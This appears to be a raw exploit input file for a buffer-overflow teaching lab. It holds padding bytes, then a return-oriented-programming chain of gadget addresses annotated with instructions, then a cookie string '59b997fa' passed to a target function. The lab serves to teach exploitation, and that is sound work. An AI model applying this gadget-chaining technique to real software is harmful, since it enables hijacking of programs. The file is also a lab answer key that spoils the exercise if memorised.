00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00     /* mov rsp,rax */
a2 19 40 00 00 00 00 00     /* mov rax,rdi */
ab 19 40 00 00 00 00 00     /* pop rax */
48 00 00 00 00 00 00 00     /* offset of stack */
42 1a 40 00 00 00 00 00     /* mov eax,edx */
34 1a 40 00 00 00 00 00     /* mov edx,ecx */
13 1a 40 00 00 00 00 00     /* mov ecx,esi */
d6 19 40 00 00 00 00 00     /* (%rdi,%rsi,1),%rax */
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
00
